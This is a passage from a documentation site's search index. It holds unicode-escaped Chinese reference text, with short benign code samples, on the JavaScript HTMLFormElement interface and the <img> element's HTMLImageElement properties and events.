\u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 elements \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u5c5e\u4e8e\u8be5\u8868\u5355\u7684\u6240\u6709\u63a7\u4ef6\u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 length \uff1a\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5c5e\u4e8e\u8be5\u8868\u5355\u7684\u63a7\u4ef6\u6570\u91cf\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 name \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8868\u5355\u7684\u540d\u79f0\u3002 method \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\u65f6\u6240\u4f7f\u7528\u7684 HTTP \u65b9\u6cd5\u3002 target \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u540e\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7684\u5c55\u793a\u4f4d\u7f6e\u3002 action \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u6570\u636e\u7684 URL\u3002 enctype \uff08\u6216 encoding \uff09\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u6570\u636e\u7684\u7f16\u7801\u65b9\u6cd5\uff0c\u53ef\u80fd\u7684\u503c\u6709 application/x-www-form-urlencoded \u3001 multipart/form-data \u548c text/plain \u3002 acceptCharset \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u6240\u80fd\u63a5\u53d7\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u591a\u4e2a\u7f16\u7801\u683c\u5f0f\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u6216\u7a7a\u683c\u5206\u9694\u3002 autocomplete \uff1a\u5b57\u7b26\u4e32 on \u6216 off \uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u8981\u5bf9 <input> \u63a7\u4ef6\u63d0\u4f9b\u81ea\u52a8\u8865\u5168\u3002 noValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5173\u95ed\u8868\u5355\u7684\u81ea\u52a8\u6821\u9a8c\u3002 HTMLFormElement \u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 submit() \uff1a\u63d0\u4ea4\u8868\u5355\uff0c\u4f46\u662f\u4e0d\u4f1a\u89e6\u53d1 submit \u4e8b\u4ef6\u548c\u8868\u5355\u7684\u81ea\u52a8\u6821\u9a8c\u3002 reset() \uff1a\u91cd\u7f6e\u8868\u5355\u63a7\u4ef6\u7684\u503c\u4e3a\u9ed8\u8ba4\u503c\u3002 checkValidity() \uff1a\u5982\u679c\u63a7\u4ef6\u80fd\u591f\u901a\u8fc7\u81ea\u52a8\u6821\u9a8c\uff0c\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \uff0c\u540c\u65f6\u89e6\u53d1 invalid \u4e8b\u4ef6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u521b\u5efa\u8868\u5355\u5e76\u63d0\u4ea4\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 var f = document . createElement ( 'form' ); document . body . appendChild ( f ); f . action = '/cgi-bin/some.cgi' ; f . method = 'POST' ; f . submit ();","title":"form"},{"location":"elements/form/#_1","text":"<form> \u5143\u7d20\u4ee3\u8868\u4e86\u8868\u5355\uff0c\u7ee7\u627f\u4e86 HTMLFormElement \u63a5\u53e3\u3002","title":" \u5143\u7d20"},{"location":"elements/form/#htmlformelement","text":"elements \uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u5c5e\u4e8e\u8be5\u8868\u5355\u7684\u6240\u6709\u63a7\u4ef6\u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 length \uff1a\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5c5e\u4e8e\u8be5\u8868\u5355\u7684\u63a7\u4ef6\u6570\u91cf\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 name \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8868\u5355\u7684\u540d\u79f0\u3002 method \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63d0\u4ea4\u7ed9\u670d\u52a1\u5668\u65f6\u6240\u4f7f\u7528\u7684 HTTP \u65b9\u6cd5\u3002 target \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u540e\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u6570\u636e\u7684\u5c55\u793a\u4f4d\u7f6e\u3002 action \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u6570\u636e\u7684 URL\u3002 enctype \uff08\u6216 encoding \uff09\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u6570\u636e\u7684\u7f16\u7801\u65b9\u6cd5\uff0c\u53ef\u80fd\u7684\u503c\u6709 application/x-www-form-urlencoded \u3001 multipart/form-data \u548c text/plain \u3002 acceptCharset \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u670d\u52a1\u5668\u6240\u80fd\u63a5\u53d7\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u591a\u4e2a\u7f16\u7801\u683c\u5f0f\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u6216\u7a7a\u683c\u5206\u9694\u3002 autocomplete \uff1a\u5b57\u7b26\u4e32 on \u6216 off \uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u8981\u5bf9 <input> \u63a7\u4ef6\u63d0\u4f9b\u81ea\u52a8\u8865\u5168\u3002 noValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5173\u95ed\u8868\u5355\u7684\u81ea\u52a8\u6821\u9a8c\u3002","title":"HTMLFormElement \u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"elements/form/#htmlformelement_1","text":"submit() \uff1a\u63d0\u4ea4\u8868\u5355\uff0c\u4f46\u662f\u4e0d\u4f1a\u89e6\u53d1 submit \u4e8b\u4ef6\u548c\u8868\u5355\u7684\u81ea\u52a8\u6821\u9a8c\u3002 reset() \uff1a\u91cd\u7f6e\u8868\u5355\u63a7\u4ef6\u7684\u503c\u4e3a\u9ed8\u8ba4\u503c\u3002 checkValidity() \uff1a\u5982\u679c\u63a7\u4ef6\u80fd\u591f\u901a\u8fc7\u81ea\u52a8\u6821\u9a8c\uff0c\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \uff0c\u540c\u65f6\u89e6\u53d1 invalid \u4e8b\u4ef6\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u521b\u5efa\u8868\u5355\u5e76\u63d0\u4ea4\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 var f = document . createElement ( 'form' ); document . body . appendChild ( f ); f . action = '/cgi-bin/some.cgi' ; f . method = 'POST' ; f . submit ();","title":"HTMLFormElement \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"elements/image/","text":"\u5143\u7d20 \u00b6 \u6982\u8ff0 \u00b6 <img> \u5143\u7d20\u7528\u4e8e\u63d2\u5165\u56fe\u7247\uff0c\u4e3b\u8981\u7ee7\u627f\u4e86 HTMLImageElement \u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e00\u4e2a\u539f\u751f\u6784\u9020\u51fd\u6570 Image \uff0c\u7528\u4e8e\u751f\u6210 HTMLImageElement \u5b9e\u4f8b\u3002 1 2 3 var img = new Image (); img instanceof Image // true img instanceof HTMLImageElement // true Image \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u5206\u522b\u8868\u793a <img> \u5143\u7d20\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 1 2 3 4 5 // \u8bed\u6cd5 Image ( width , height ) // \u7528\u6cd5 var myImage = new Image ( 100 , 200 ); <img> \u5b9e\u4f8b\u7684 src \u5c5e\u6027\u53ef\u4ee5\u5b9a\u4e49\u56fe\u50cf\u7684\u7f51\u5740\u3002 1 2 var img = new Image (); img . src = 'picture.jpg' ; \u65b0\u751f\u6210\u7684 <img> \u5b9e\u4f8b\u5e76\u4e0d\u5c5e\u4e8e\u6587\u6863\u7684\u4e00\u90e8\u5206\u3002\u5982\u679c\u60f3\u8ba9\u5b83\u663e\u793a\u5728\u6587\u6863\u4e2d\uff0c\u5fc5\u987b\u624b\u52a8\u63d2\u5165\u6587\u6863\u3002 1 2 3 var img = new Image (); img . src = 'image1.png' ; document . body . appendChild ( img ); \u9664\u4e86\u4f7f\u7528 Image \u6784\u9020\uff0c\u4e0b\u9762\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u5f97\u5230 HTMLImageElement \u5b9e\u4f8b\u3002 document.images \u7684\u6210\u5458 \u8282\u70b9\u9009\u53d6\u65b9\u6cd5\uff08\u6bd4\u5982 document.getElementById \uff09\u5f97\u5230\u7684 <img> \u8282\u70b9 document.createElement('img') \u751f\u6210\u7684 <img> \u8282\u70b9 1 2 3 4 5 6 7 8 9 10 document . images [ 0 ] instanceof HTMLImageElement // true var img = document . getElementById ( 'myImg' ); img instanceof HTMLImageElement // true var img = document . createElement ( 'img' ); img instanceof HTMLImageElement // true HTMLImageElement \u5b9e\u4f8b\u9664\u4e86\u5177\u6709 Node\u3001Element\u3001HTMLElement \u63a5\u53e3\u4ee5\u5916\uff0c\u8fd8\u62e5\u6709\u4e00\u4e9b\u72ec\u6709\u7684\u5c5e\u6027\u3002\u8fd9\u4e2a\u63a5\u53e3\u6ca1\u6709\u5b9a\u4e49\u81ea\u5df1\u7684\u65b9\u6cd5\u3002 \u7279\u6027\u76f8\u5173\u7684\u5c5e\u6027 \u00b6 \uff081\uff09HTMLImageElement.src HTMLImageElement.src \u5c5e\u6027\u8fd4\u56de\u56fe\u50cf\u7684\u5b8c\u6574\u7f51\u5740\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <img width=\"300\" height=\"400\" id=\"myImg\" src=\"http://example.com/pic.jpg\"> var img = document . getElementById ( 'img' ); img . src // http://example.com/pic.jpg \uff082\uff09HTMLImageElement.currentSrc HTMLImageElement.currentSrc \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6b63\u5728\u5c55\u793a\u7684\u56fe\u50cf\u7684\u7f51\u5740\u3002JavaScript \u548c CSS \u7684 mediaQuery \u90fd\u53ef\u80fd\u6539\u53d8\u6b63\u5728\u5c55\u793a\u7684\u56fe\u50cf\u3002 \uff083\uff09HTMLImageElement.alt HTMLImageElement.alt \u5c5e\u6027\u53ef\u4ee5\u8bfb\u5199 <img> \u7684 HTML \u5c5e\u6027 alt \uff0c\u8868\u793a\u5bf9\u56fe\u7247\u7684\u6587\u5b57\u8bf4\u660e\u3002 \uff084\uff09HTMLImageElement.isMap\uff0cHTMLImageElement.useMap HTMLImageElement.isMap \u5c5e\u6027\u5bf9\u5e94 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 ismap \uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u56fe\u50cf\u662f\u5426\u4e3a\u670d\u52a1\u5668\u7aef\u7684\u56fe\u50cf\u6620\u5c04\u7684\u4e00\u90e8\u5206\u3002 HTMLImageElement.useMap \u5c5e\u6027\u5bf9\u5e94 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 usemap \uff0c\u8868\u793a\u5f53\u524d\u56fe\u50cf\u5bf9\u5e94\u7684 <map> \u5143\u7d20\u3002 \uff085\uff09HTMLImageElement.srcset\uff0cHTMLImageElement.sizes HTMLImageElement.srcset \u5c5e\u6027\u548c HTMLImageElement.sizes \u5c5e\u6027\uff0c\u5206\u522b\u7528\u4e8e\u8bfb\u5199 <img> \u5143\u7d20\u7684 srcset \u5c5e\u6027\u548c sizes \u5c5e\u6027\u3002\u5b83\u4eec\u7528\u4e8e <img> \u5143\u7d20\u7684\u54cd\u5e94\u5f0f\u52a0\u8f7d\u3002 srcset \u5c5e\u6027\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4f46\u662f sizes \u5c5e\u6027\u5fc5\u987b\u4e0e srcset \u5c5e\u6027\u540c\u65f6\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // HTML \u4ee3\u7801\u5982\u4e0b // <img srcset=\"example-320w.jpg 320w, // example-480w.jpg 480w, // example-800w.jpg 800w\" // sizes=\"(max-width: 320px) 280px, // (max-width: 480px) 440px, // 800px\" // id=\"myImg\" // src=\"example-800w.jpg\"> var img = document . getElementById ( 'myImg' ); img . srcset // \"example-320w.jpg 320w, // example-480w.jpg 480w, // example-800w.jpg 800w\" img . sizes // \"(max-width: 320px) 280px, // (max-width: 480px) 440px, // 800px\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c sizes \u5c5e\u6027\u6307\u5b9a\uff0c\u5bf9\u4e8e\u5c0f\u4e8e 320px \u7684\u5c4f\u5e55\uff0c\u56fe\u50cf\u7684\u5bbd\u5ea6\u4e3a 280px \uff1b\u5bf9\u4e8e\u5c0f\u4e8e 480px \u7684\u5c4f\u5e55\uff0c\u56fe\u50cf\u5bbd\u5ea6\u4e3a 440px \uff1b\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u56fe\u50cf\u5bbd\u5ea6\u4e3a 800px \u3002\u7136\u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u6839\u636e\u5f53\u524d\u5c4f\u5e55\u4e0b\u7684\u56fe\u50cf\u5bbd\u5ea6\uff0c\u5230 srcset \u5c5e\u6027\u52a0\u8f7d\u5bbd\u5ea6\u6700\u63a5\u8fd1\u7684\u56fe\u50cf\u3002 HTMLImageElement.width\uff0cHTMLImageElement.height \u00b6 width \u5c5e\u6027\u8868\u793a <img> \u7684 HTML \u5bbd\u5ea6\uff0c height \u5c5e\u6027\u8868\u793a\u9ad8\u5ea6\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img width=\"300\" height=\"400\" id=\"myImg\" src=\"pic.jpg\"> var img = document . getElementById ( 'img' ); img . width // 300 img . height // 400 \u5982\u679c\u56fe\u50cf\u8fd8\u6ca1\u6709\u52a0\u8f7d\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f 0 \u3002 \u5982\u679c HTML \u4ee3\u7801\u6ca1\u6709\u8bbe\u7f6e width \u548c height \u5c5e\u6027\uff0c\u5219\u5b83\u4eec\u8fd4\u56de\u7684\u662f\u56fe\u50cf\u7684\u5b9e\u9645\u5bbd\u5ea6\u548c\u9ad8\u5ea6\uff0c\u5373 HTMLImageElement.naturalWidth \u5c5e\u6027\u548c HTMLImageElement.naturalHeight \u5c5e\u6027\u3002 HTMLImageElement.naturalWidth\uff0cHTMLImageElement.naturalHeight \u00b6 HTMLImageElement.naturalWidth \u5c5e\u6027\u8868\u793a\u56fe\u50cf\u7684\u5b9e\u9645\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c HTMLImageElement.naturalHeight \u5c5e\u6027\u8868\u793a\u5b9e\u9645\u9ad8\u5ea6\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\u3002 \u5982\u679c\u56fe\u50cf\u8fd8\u6ca1\u6709\u6307\u5b9a\u6216\u4e0d\u53ef\u5f97\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u7b49\u4e8e 0 \u3002 1 2 3 4 var img = document . getElementById ( 'img' ); if ( img . naturalHeight > img . naturalWidth ) { img . classList . add ( 'portrait' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u56fe\u7247\u7684\u9ad8\u5ea6\u5927\u4e8e\u5bbd\u5ea6\uff0c\u5219\u8bbe\u4e3a portrait \u6a21\u5f0f\u3002 HTMLImageElement.complete \u00b6 HTMLImageElement.complete \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u56fe\u8868\u662f\u5426\u5df2\u7ecf\u52a0\u8f7d\u5b8c\u6210\u3002\u5982\u679c <img> \u5143\u7d20\u6ca1\u6709 src \u5c5e\u6027\uff0c\u4e5f\u4f1a\u8fd4\u56de true \u3002 HTMLImageElement.crossOrigin \u00b6 HTMLImageElement.crossOrigin \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199 <img> \u5143\u7d20\u7684 crossorigin \u5c5e\u6027\uff0c\u8868\u793a\u8de8\u57df\u8bbe\u7f6e\u3002 \u8fd9\u4e2a\u5c5e\u6027\u6709\u4e24\u4e2a\u53ef\u80fd\u7684\u503c\u3002 anonymous \uff1a\u8de8\u57df\u8bf7\u6c42\u4e0d\u8981\u6c42\u7528\u6237\u8eab\u4efd\uff08credentials\uff09\uff0c\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002 use-credentials \uff1a\u8de8\u57df\u8bf7\u6c42\u8981\u6c42\u7528\u6237\u8eab\u4efd\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <img crossorigin=\"anonymous\" id=\"myImg\" src=\"pic.jpg\"> var img = document . getElementById ( 'img' ); img . crossOrigin // \"anonymous\" HTMLImageElement.referrerPolicy \u00b6 HTMLImageElement.referrerPolicy \u7528\u6765\u8bfb\u5199 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 referrerpolicy \uff0c\u8868\u793a\u8bf7\u6c42\u56fe\u50cf\u8d44\u6e90\u65f6\uff0c\u5982\u4f55\u5904\u7406 HTTP \u8bf7\u6c42\u7684 referrer \u5b57\u6bb5\u3002 \u5b83\u6709\u4e94\u4e2a\u53ef\u80fd\u7684\u503c\u3002 no-referrer \uff1a\u4e0d\u5e26\u6709 referrer \u5b57\u6bb5\u3002 no-referrer-when-downgrade \uff1a\u5982\u679c\u8bf7\u6c42\u7684\u5730\u5740\u4e0d\u662f HTTPS \u534f\u8bae\uff0c\u5c31\u4e0d\u5e26\u6709 referrer \u5b57\u6bb5\uff0c\u8fd9\u662f\u9ed8\u8ba4\u503c\u3002 origin \uff1a referrer \u5b57\u6bb5\u662f\u5f53\u524d\u7f51\u9875\u7684\u5730\u5740\uff0c\u5305\u542b\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u3002 origin-when-cross-origin \uff1a\u5982\u679c\u8bf7\u6c42\u7684\u5730\u5740\u4e0e\u5f53\u524d\u7f51\u9875\u662f\u540c\u6e90\u5173\u7cfb\uff0c\u90a3\u4e48 referrer \u5b57\u6bb5\u5c06\u5e26\u6709\u5b8c\u6574\u8def\u5f84\uff0c\u5426\u5219\u5c06\u53ea\u5305\u542b\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u3002 unsafe-url \uff1a referrer \u5b57\u6bb5\u5305\u542b\u5f53\u524d\u7f51\u9875\u7684\u5730\u5740\uff0c\u9664\u4e86\u534f\u8bae\u3001\u57df\u540d\u548c\u7aef\u53e3\u4ee5\u5916\uff0c\u8fd8\u5305\u62ec\u8def\u5f84\u3002\u8fd9\u4e2a\u8bbe\u7f6e\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u4f1a\u6cc4\u6f0f\u8def\u5f84\u4fe1\u606f\u3002 HTMLImageElement.x\uff0cHTMLImageElement.y \u00b6 HTMLImageElement.x \u5c5e\u6027\u8fd4\u56de\u56fe\u50cf\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\uff0c HTMLImageElement.y \u5c5e\u6027\u8fd4\u56de\u7eb5\u5750\u6807\u3002 \u4e8b\u4ef6\u5c5e\u6027 \u00b6 \u56fe\u50cf\u52a0\u8f7d\u5b8c\u6210\uff0c\u4f1a\u89e6\u53d1 onload \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a <img src=\"example.jpg\" onload=\"loadImage()\"> function loadImage () { console . log ( 'Image is loaded' ); } \u56fe\u50cf\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef\uff0c\u4f1a\u89e6\u53d1 onerror \u5c5e\u6027\u6307\u5b9a\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 // HTML \u4ee3\u7801\u4e3a <img src=\"image.gif\" onerror=\"myFunction()\"> function myFunction () { console . log ( 'There is something wrong' ); }","title":"img"},{"location":"elements/image/#_1","text":"","title":" \u5143\u7d20"},{"location":"elements/image/#_2","text":"<img> \u5143\u7d20\u7528\u4e8e\u63d2\u5165\u56fe\u7247\uff0c\u4e3b\u8981\u7ee7\u627f\u4e86 HTMLImageElement \u63a5\u53e3\u3002 \u6d4f\u89c8\u5668\u63d0\u4f9b\u4e00\u4e2a\u539f\u751f\u6784\u9020\u51fd\u6570 Image \uff0c\u7528\u4e8e\u751f\u6210 HTMLImageElement \u5b9e\u4f8b\u3002 1 2 3 var img = new Image (); img instanceof Image // true img instanceof HTMLImageElement // true Image \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u6574\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u5206\u522b\u8868\u793a <img> \u5143\u7d20\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 1 2 3 4 5 // \u8bed\u6cd5 Image ( width , height ) // \u7528\u6cd5 var myImage = new Image ( 100 , 200 ); <img> \u5b9e\u4f8b\u7684 src \u5c5e\u6027\u53ef\u4ee5\u5b9a\u4e49\u56fe\u50cf\u7684\u7f51\u5740\u3002 1 2 var img = new Image (); img . src = 'picture.jpg' ; \u65b0\u751f\u6210\u7684 <img> \u5b9e\u4f8b\u5e76\u4e0d\u5c5e\u4e8e\u6587\u6863\u7684\u4e00\u90e8\u5206\u3002\u5982\u679c\u60f3\u8ba9\u5b83\u663e\u793a\u5728\u6587\u6863\u4e2d\uff0c\u5fc5\u987b\u624b\u52a8\u63d2\u5165\u6587\u6863\u3002 1 2 3 var img = new Image (); img . src = 'image1.png' ; document . body . appendChild ( img ); \u9664\u4e86\u4f7f\u7528 Image \u6784\u9020\uff0c\u4e0b\u9762\u7684\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u5f97\u5230 HTMLImageElement \u5b9e\u4f8b\u3002 document.images \u7684\u6210\u5458 \u8282\u70b9\u9009\u53d6\u65b9\u6cd5\uff08\u6bd4\u5982 document.getElementById \uff09\u5f97\u5230\u7684 <img> \u8282\u70b9 document.createElement('img') \u751f\u6210\u7684 <img> \u8282\u70b9 1 2 3 4 5 6 7 8 9 10 document . images [ 0 ] instanceof HTMLImageElement // true var img = document . getElementById ( 'myImg' ); img instanceof HTMLImageElement // true var img = document . createElement ( 'img' ); img instanceof HTMLImageElement // true HTMLImageElement \u5b9e\u4f8b\u9664\u4e86\u5177\u6709 Node\u3001Element\u3001HTMLElement \u63a5\u53e3\u4ee5\u5916\uff0c\u8fd8\u62e5\u6709\u4e00\u4e9b\u72ec\u6709\u7684\u5c5e\u6027\u3002\u8fd9\u4e2a\u63a5\u53e3\u6ca1\u6709\u5b9a\u4e49\u81ea\u5df1\u7684\u65b9\u6cd5\u3002","title":"\u6982\u8ff0"},{"location":"elements/image/#_3","text":"\uff081\uff09HTMLImageElement.src HTMLImageElement.src \u5c5e\u6027\u8fd4\u56de\u56fe\u50cf\u7684\u5b8c\u6574\u7f51\u5740\u3002 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <img width=\"300\" height=\"400\" id=\"myImg\" src=\"http://example.com/pic.jpg\"> var img = document . getElementById ( 'img' ); img . src // http://example.com/pic.jpg \uff082\uff09HTMLImageElement.currentSrc HTMLImageElement.currentSrc \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6b63\u5728\u5c55\u793a\u7684\u56fe\u50cf\u7684\u7f51\u5740\u3002JavaScript \u548c CSS \u7684 mediaQuery \u90fd\u53ef\u80fd\u6539\u53d8\u6b63\u5728\u5c55\u793a\u7684\u56fe\u50cf\u3002 \uff083\uff09HTMLImageElement.alt HTMLImageElement.alt \u5c5e\u6027\u53ef\u4ee5\u8bfb\u5199 <img> \u7684 HTML \u5c5e\u6027 alt \uff0c\u8868\u793a\u5bf9\u56fe\u7247\u7684\u6587\u5b57\u8bf4\u660e\u3002 \uff084\uff09HTMLImageElement.isMap\uff0cHTMLImageElement.useMap HTMLImageElement.isMap \u5c5e\u6027\u5bf9\u5e94 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 ismap \uff0c\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u56fe\u50cf\u662f\u5426\u4e3a\u670d\u52a1\u5668\u7aef\u7684\u56fe\u50cf\u6620\u5c04\u7684\u4e00\u90e8\u5206\u3002 HTMLImageElement.useMap \u5c5e\u6027\u5bf9\u5e94 <img> \u5143\u7d20\u7684 HTML \u5c5e\u6027 usemap \uff0c\u8868\u793a\u5f53\u524d\u56fe\u50cf\u5bf9\u5e94\u7684 <map> \u5143\u7d20\u3002 \uff085\uff09HTMLImageElement.srcset\uff0cHTMLImageElement.sizes HTMLImageElement.srcset \u5c5e\u6027\u548c HTMLImageElement.sizes \u5c5e\u6027\uff0c\u5206\u522b\u7528\u4e8e\u8bfb\u5199 <img> \u5143\u7d20\u7684 srcset \u5c5e\u6027\u548c sizes \u5c5e\u6027\u3002\u5b83\u4eec\u7528\u4e8e <img> \u5143\u7d20\u7684\u54cd\u5e94\u5f0f\u52a0\u8f7d\u3002 srcset \u5c5e\u6027\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4f46\u662f sizes \u5c5e\u6027\u5fc5\u987b\u4e0e srcset \u5c5e\u6027\u540c\u65f6\u4f7f\u7528\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // HTML \u4ee3\u7801\u5982\u4e0b // <img srcset=\"example-320w.jpg 320w, // example-480w.jpg 480w, // example-800w.jpg 800w\" // sizes=\"(max-width: 320px) 280px, // (max-width: 480px) 440px, // 800px\" // id=\"myImg\" // src=\"example-800w.jpg\"> var img = document . getElementById ( 'myImg' ); img . srcset // \"example-320w.jpg 320w, // example-480w.jpg 480w, // example-800w.jpg 800w\" img . sizes // \"(max-width: 320px) 280px, // (max-width: 480px) 440px, // 800px\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c sizes \u5c5e\u6027\u6307\u5b9a\uff0c\u5bf9\u4e8e\u5c0f\u4e8e 320px \u7684\u5c4f\u5e55\uff0c\u56fe\u50cf\u7684\u5bbd\u5ea6\u4e3a 280px \uff1b\u5bf9\u4e8e\u5c0f\u4e8e 480px \u7684\u5c4f\u5e55\uff0c\u56fe\u50cf\u5bbd\u5ea6\u4e3a 440px \uff1b\u5176\u4ed6\u60c5\u51b5\u4e0b\uff0c\u56fe\u50cf\u5bbd\u5ea6\u4e3a 800px \u3002\u7136\u540e\uff0c\u6d4f\u89c8\u5668\u4f1a\u6839\u636e\u5f53\u524d\u5c4f\u5e55\u4e0b\u7684\u56fe\u50cf\u5bbd\u5ea6\uff0c\u5230 srcset \u5c5e\u6027\u52a0\u8f7d\u5bbd\u5ea6\u6700\u63a5\u8fd1\u7684\u56fe\u50cf\u3002","title":"\u7279\u6027\u76f8\u5173\u7684\u5c5e\u6027"},{"location":"elements/image/#htmlimageelementwidthhtmlimageelementheight","text":"width \u5c5e\u6027\u8868\u793a <img> \u7684 HTML \u5bbd\u5ea6\uff0c height \u5c5e\u6027\u8868\u793a\u9ad8\u5ea6\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f\u6574\u6570\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <img width=\"300\" height=\"400\" id=\"myImg\" src=\"pic.jpg\"> var img = document . getElementById ( 'img' ); img . width // 300 img . height // 400 \u5982\u679c\u56fe\u50cf\u8fd8\u6ca1\u6709\u52a0\u8f7d\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de\u7684\u90fd\u662f 0 \u3002 \u5982\u679c HTML \u4ee3\u7801\u6ca1\u6709\u8bbe\u7f6e width \u548c height \u5c5e\u6027\uff0c\u5219\u5b83\u4eec\u8fd4\u56de\u7684\u662f\u56fe\u50cf\u7684\u5b9e\u9645\u5bbd\u5ea6\u548c\u9ad8\u5ea6\uff0c\u5373 HTMLImageElement.naturalWidth \u5c5e\u6027\u548c HTMLImageElement.naturalHeight 